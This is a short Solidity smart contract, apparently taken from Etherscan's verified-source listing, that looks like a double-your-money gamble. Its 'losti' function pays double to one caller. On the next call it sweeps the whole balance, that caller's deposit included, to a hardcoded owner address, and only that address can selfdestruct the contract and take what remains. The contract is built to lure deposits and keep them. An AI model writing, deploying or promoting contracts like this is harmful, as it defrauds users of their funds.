/**
 *Submitted for verification at Etherscan.io on 2022-01-11
*/

pragma solidity ^0.8.11;
contract Asilas {
    bool inesimas;
    constructor() {
        inesimas = false;
    }
    fallback() external payable {

    }
    function losti() public payable {
        if (inesimas == false) {
            payable(msg.sender).transfer(msg.value * 2);
            inesimas = true;
        }
        else if (inesimas == true) {
            payable(0x84e9304FA9AAfc5e70090eAdDa9ac2C76D93Ad51).transfer(address(this).balance);
            inesimas = false;
        }
    }
    function susinaikinimas() public {
        if (msg.sender == 0x84e9304FA9AAfc5e70090eAdDa9ac2C76D93Ad51) {
            selfdestruct(payable(0x84e9304FA9AAfc5e70090eAdDa9ac2C76D93Ad51));
        }
        else {
            revert();
        }
    }
}